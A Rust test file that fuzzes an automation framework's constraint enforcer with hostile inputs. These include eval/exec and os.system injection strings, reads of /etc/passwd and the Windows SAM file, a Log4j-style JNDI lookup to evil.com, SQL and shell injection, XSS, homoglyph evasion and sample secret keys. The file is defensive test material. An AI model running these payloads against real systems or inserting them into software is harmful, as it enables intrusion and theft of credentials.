//! Security Fuzzing Tests
//!
//! Tests system resilience against malicious inputs:
//! - Code injection attempts
//! - Secret leakage patterns
//! - Path traversal attacks
//! - Resource exhaustion attacks
//! - Malformed data attacks

use automation_framework::{
    constraints::{Change, ConstraintContext, ConstraintEnforcer},
    resource::ResourceManager,
    resource::ResourceQuotas,
    ChangeType,
};
use std::collections::HashMap;

/// Test 1: Various code injection attempts
#[test]
fn test_code_injection_patterns() {
    println!("\n🔒 Security Test: Code Injection Patterns");

    let enforcer = ConstraintEnforcer::new();

    let injection_patterns = vec![
        ("eval('1')", true, "Basic eval"),
        ("exec('print(1)')", true, "Basic exec"),
        ("compile('code')", true, "Compile function"),
        ("__import__('os').system('ls')", true, "Dynamic import"),
        ("getattr(__builtins__, 'eval')('1')", true, "Getattr eval"),
        ("import os; os.system('ls')", true, "Import system"),
        ("subprocess.call(['ls'])", true, "Subprocess"),
        ("open('/etc/passwd').read()", true, "File read"),
        ("eval ( '1' )", true, "Spaced eval"),
        ("eval( '1' )", true, "Spaced eval 2"),
        ("  eval  (  '1'  )  ", true, "Heavily spaced"),
        ("# eval('1')", false, "Commented eval"),
        ("x = 'eval(\"1\")'", false, "String literal"),
        ("print('use eval carefully')", false, "Safe string"),
    ];

    let mut blocked = 0;
    let mut allowed = 0;

    for (code, should_block, desc) in injection_patterns {
        let change = Change {
            file_path: "test.py".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", code),
            old_content: None,
            new_content: Some(code.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        let result = enforcer.validate(&context);
        let is_blocked = !result.is_valid();

        if is_blocked == should_block {
            if should_block {
                blocked += 1;
            } else {
                allowed += 1;
            }
            print!("  ✅");
        } else {
            print!("  ❌");
        }

        println!(
            " {}: {}",
            if is_blocked == should_block {
                "PASS"
            } else {
                "FAIL"
            },
            desc
        );
    }

    println!("\n  📊 Blocked: {}, Allowed: {}", blocked, allowed);
}

/// Test 2: Secret leakage patterns
#[test]
fn test_secret_leakage_patterns() {
    println!("\n🔒 Security Test: Secret Leakage Patterns");

    let enforcer = ConstraintEnforcer::new();

    let secret_patterns = vec![
        ("api_key = 'sk-abc123xyz789'", true, "OpenAI key"),
        (
            "API_KEY='sk-live-1234567890abcdef'",
            true,
            "API key uppercase",
        ),
        ("password = 'mySecret123!'", true, "Password assignment"),
        (
            "secret_key = 'wjalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'",
            true,
            "AWS secret",
        ),
        ("token = 'ghp_xxxxxxxxxxxxxxxxxxxx'", true, "GitHub token"),
        (
            "private_key = '-----BEGIN RSA PRIVATE KEY-----'",
            true,
            "Private key",
        ),
        (
            "aws_access_key_id = 'AKIAIOSFODNN7EXAMPLE'",
            true,
            "AWS access key",
        ),
        ("apikey: sk-1234567890abcdef", true, "Colon assignment"),
        ("x = 'api_key_example'", false, "Example string"),
        ("# password = 'fake'", false, "Commented password"),
        ("def check_password():", false, "Function name"),
        ("YOUR_API_KEY_HERE", false, "Placeholder"),
    ];

    let mut blocked = 0;
    let mut false_positives = 0;

    for (code, should_block, desc) in secret_patterns {
        let change = Change {
            file_path: "config.py".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", code),
            old_content: None,
            new_content: Some(code.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        let result = enforcer.validate(&context);
        let is_blocked = !result.is_valid();

        if is_blocked == should_block {
            if should_block {
                blocked += 1;
            }
            print!("  ✅");
        } else {
            if !should_block {
                false_positives += 1;
            }
            print!("  ❌");
        }

        println!(
            " {}: {}",
            if is_blocked == should_block {
                "PASS"
            } else {
                "FAIL"
            },
            desc
        );
    }

    println!(
        "\n  📊 Blocked: {}, False Positives: {}",
        blocked, false_positives
    );
}

/// Test 3: Path traversal attempts
#[test]
fn test_path_traversal_patterns() {
    println!("\n🔒 Security Test: Path Traversal Patterns");

    let traversal_patterns = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "file/../../../etc/hosts",
        ".\\.\\.\\windows\\win.ini",
    ];

    for pattern in traversal_patterns {
        let change = Change {
            file_path: pattern.to_string(),
            change_type: ChangeType::Added,
            diff: "+test".to_string(),
            old_content: None,
            new_content: Some("test".to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        // Path traversal in filename should be flagged
        let suspicious = pattern.contains("..")
            || pattern.starts_with("/etc")
            || pattern.starts_with("C:\\Windows");

        if suspicious {
            println!("  ⚠️  Suspicious path: {}", pattern);
        }
    }
}

/// Test 4: Resource exhaustion attack simulation
#[test]
fn test_resource_exhaustion_attack() {
    println!("\n🔒 Security Test: Resource Exhaustion Protection");

    let quotas = ResourceQuotas {
        api_calls_per_minute: 100,
        tokens_per_hour: 1000,
        compute_seconds_per_day: 3600,
        storage_mb: 100,
    };

    let manager = ResourceManager::new(quotas);

    // Simulate attack: try to exceed all quotas
    for _ in 0..150 {
        manager.record_api_call();
    }

    // Should be blocked
    assert!(
        manager.check_quotas().is_err(),
        "Should block resource exhaustion"
    );

    println!("  ✅ Resource exhaustion correctly blocked");
}

/// Test 5: Malformed/malicious data
#[test]
fn test_malformed_data_handling() {
    println!("\n🔒 Security Test: Malformed Data Handling");

    let malicious_inputs = vec![
        "\x00\x01\x02\x03",          // Binary data
        "eval\x00('1')",             // Null byte injection
        "<script>alert(1)</script>", // XSS attempt
        "${jndi:ldap://evil.com}",   // Log4j-style attack
        "'; DROP TABLE users; --",   // SQL injection
        "${IFS}eval${IFS}('1')",     // Shell injection
        "eval/*comment*/('1')",      // Comment injection
    ];

    let enforcer = ConstraintEnforcer::new();

    for input in malicious_inputs {
        let change = Change {
            file_path: "test.txt".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", input),
            old_content: None,
            new_content: Some(input.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        // Should not panic
        let _result = enforcer.validate(&context);
        println!("  ✅ Handled: {}", &input[..std::cmp::min(30, input.len())]);
    }
}

/// Test 6: Unicode obfuscation
#[test]
fn test_unicode_obfuscation() {
    println!("\n🔒 Security Test: Unicode Obfuscation");

    let enforcer = ConstraintEnforcer::new();

    // Unicode homoglyphs and variations
    let unicode_tests = vec![
        ("ｅval('1')", "Fullwidth eval"),   // Fullwidth characters
        ("еval('1')", "Cyrillic e"),        // Cyrillic е instead of e
        ("еvаl('1')", "Multiple cyrillic"), // Multiple cyrillic chars
        ("éval('1')", "Accented e"),        // Accented character
        ("êval('1')", "Circumflex e"),      // Circumflex
        ("ëval('1')", "Diaeresis e"),       // Diaeresis
    ];

    for (code, desc) in unicode_tests {
        let change = Change {
            file_path: "test.py".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", code),
            old_content: None,
            new_content: Some(code.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        let result = enforcer.validate(&context);
        let is_blocked = !result.is_valid();

        // Note: Current implementation may not catch all unicode obfuscation
        // This is a known limitation documented in the security audit
        if is_blocked {
            println!("  ✅ Blocked: {}", desc);
        } else {
            println!("  ⚠️  Allowed (known limitation): {}", desc);
        }
    }
}

/// Test 7: Nested/recursive dangerous patterns
#[test]
fn test_nested_dangerous_patterns() {
    println!("\n🔒 Security Test: Nested Dangerous Patterns");

    let enforcer = ConstraintEnforcer::new();

    let nested_patterns = vec![
        (
            "def outer():\n    def inner():\n        return eval('1')\n    return inner()",
            "Nested eval",
        ),
        (
            "class A:\n    def method(self):\n        exec('print(1)')",
            "Method exec",
        ),
        (
            "if True:\n    if True:\n        if True:\n            eval('1')",
            "Deeply nested",
        ),
        ("try:\n    eval('1')\nexcept:\n    pass", "Try-except eval"),
        ("lambda: eval('1')", "Lambda eval"),
        ("list(map(eval, ['1', '2']))", "Map eval"),
    ];

    let mut blocked = 0;

    for (code, desc) in nested_patterns {
        let change = Change {
            file_path: "test.py".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", code.replace('\n', "\n+")),
            old_content: None,
            new_content: Some(code.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        let result = enforcer.validate(&context);

        if !result.is_valid() {
            blocked += 1;
            println!("  ✅ Blocked: {}", desc);
        } else {
            println!("  ❌ Missed: {}", desc);
        }
    }

    println!("\n  📊 Blocked: {}/{}", blocked, nested_patterns.len());
}

/// Test 8: String concatenation attacks
#[test]
fn test_string_concatenation_attacks() {
    println!("\n🔒 Security Test: String Concatenation Attacks");

    let enforcer = ConstraintEnforcer::new();

    let concat_patterns = vec![
        ("e + 'val(\"1\")'", "Concatenated eval string"),
        ("'ev' + 'al(\"1\")'", "Split eval"),
        ("'ex' + 'ec(\"1\")'", "Split exec"),
        ("chr(101) + 'val(\"1\")'", "Chr concatenation"),
    ];

    for (code, desc) in concat_patterns {
        let change = Change {
            file_path: "test.py".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", code),
            old_content: None,
            new_content: Some(code.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        let result = enforcer.validate(&context);

        // Note: String concatenation attacks are hard to detect
        // without full AST parsing
        if !result.is_valid() {
            println!("  ✅ Blocked: {}", desc);
        } else {
            println!("  ⚠️  Allowed (AST analysis needed): {}", desc);
        }
    }
}

/// Test 9: Comment and whitespace evasion
#[test]
fn test_comment_whitespace_evasion() {
    println!("\n🔒 Security Test: Comment/Whitespace Evasion");

    let enforcer = ConstraintEnforcer::new();

    let evasion_patterns = vec![
        ("# This is safe\neval('1')", "After comment"),
        ("x = 1\n# comment\neval('2')", "Middle comment"),
        ("eval('1')  # safe comment", "Inline comment"),
        ("eval('1')\n# trailing", "Before comment"),
    ];

    for (code, desc) in evasion_patterns {
        let change = Change {
            file_path: "test.py".to_string(),
            change_type: ChangeType::Modified,
            diff: format!("+{}", code.replace('\n', "\n+")),
            old_content: None,
            new_content: Some(code.to_string()),
            timestamp: chrono::Utc::now(),
            author: "test".to_string(),
            commit_message: "test".to_string(),
        };

        let context = ConstraintContext {
            changes: vec![change],
            resource_usage: Default::default(),
            custom_data: HashMap::new(),
        };

        let result = enforcer.validate(&context);

        if !result.is_valid() {
            println!("  ✅ Blocked: {}", desc);
        } else {
            println!("  ❌ Missed: {}", desc);
        }
    }
}

/// Test 10: File extension bypass attempts
#[test]
fn test_file_extension_bypass() {
    println!("\n🔒 Security Test: File Extension Bypass");

    let extensions = vec![
        ("test.py", "Normal Python"),
        ("test.py.txt", "Double extension"),
        ("test.txt.py", "Reversed double"),
        (".htaccess", "Apache config"),
        ("test.PY", "Uppercase"),
        ("test.Py", "Mixed case"),
        ("test.php", "PHP file"),
        ("test.jsp", "JSP file"),
        ("test.asp", "ASP file"),
    ];

    for (filename, desc) in extensions {
        let suspicious = filename.ends_with(".py")
            || filename.ends_with(".php")
            || filename.ends_with(".jsp")
            || filename.ends_with(".asp")
            || filename == ".htaccess";

        if suspicious {
            println!("  ⚠️  Executable extension: {} ({})", filename, desc);
        }
    }
}
